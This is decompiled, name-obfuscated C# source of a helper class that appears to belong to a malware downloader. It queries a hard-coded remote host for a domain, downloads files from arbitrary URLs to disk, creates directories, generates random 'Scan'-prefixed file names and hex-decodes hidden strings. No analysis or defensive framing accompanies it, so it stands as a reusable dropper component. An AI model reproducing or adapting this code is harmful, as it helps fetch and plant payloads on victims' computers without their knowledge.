using System;
using System.IO;
using System.Net;
using System.Threading;

// Token: 0x02000003 RID: 3
public static class vgf
{
	// Token: 0x06000002 RID: 2 RVA: 0x00002090 File Offset: 0x00000290
	public static void fefqeefqf(string DNG)
	{
		Directory.CreateDirectory(DNG);
	}

	// Token: 0x06000003 RID: 3 RVA: 0x0000209C File Offset: 0x0000029C
	public static string qrqwer()
	{
		HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create("http://romansoft.e3w.biz/domen");
		httpWebRequest.Accept = "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8";
		HttpWebResponse httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();
		return new StreamReader(httpWebResponse.GetResponseStream()).ReadToEnd();
	}

	// Token: 0x06000004 RID: 4 RVA: 0x000020E0 File Offset: 0x000002E0
	public static void gwredngr(string papa, string u)
	{
		WebClient webClient = new WebClient();
		webClient.DownloadFile(new Uri(u), papa);
	}

	// Token: 0x06000005 RID: 5 RVA: 0x00002100 File Offset: 0x00000300
	public static string cbxfgfbgwes()
	{
		string text = "wgrih4ее4iqhvchv5254325caolhgvwou4981894854156";
		string text2 = "Scan";
		int num = new Random().Next(4, 8);
		for (int i = 0; i < num; i++)
		{
			text2 += text[new Random().Next(0, text.Length)];
			Thread.Sleep(124);
		}
		return text2;
	}

	// Token: 0x06000006 RID: 6 RVA: 0x00002160 File Offset: 0x00000360
	public static string tre(string vcvvbvbv)
	{
		string text = string.Empty;
		while (vcvvbvbv.Length > 0)
		{
			text += Convert.ToChar(Convert.ToUInt32(vcvvbvbv.Substring(0, 2), 16)).ToString();
			vcvvbvbv = vcvvbvbv.Substring(2, vcvvbvbv.Length - 2);
		}
		return text;
	}
}
